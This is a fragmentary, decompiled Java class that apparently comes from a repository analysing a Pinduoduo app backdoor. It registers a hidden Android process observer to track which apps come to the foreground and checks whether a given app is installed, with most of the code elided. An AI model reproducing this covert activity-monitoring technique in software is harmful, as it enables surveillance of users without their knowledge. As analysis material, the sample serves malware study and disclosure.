package com.google.android.sd.biz_dynamic_dex.td.logcat.e;
...
public final class a extends IProcessObserver.Stub implements a.a {
  private Context a;
  ...
  public final boolean a() {
    try {
      ...
      if (!com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.c(this.a, str)) {
        b("impl_app_has_uninstall");
        return false;
      } 
      this.d = com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.e(this.a, str);
      int i = com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.d(this.a, str);
      this.e = i;
      if (i == -1) {
  ...
  public final void onForegroundActivitiesChanged(int paramInt1, int paramInt2, boolean paramBoolean) {
    try {
      ...
      b.a("impl_foreground_change_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
...
/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\e\a.class
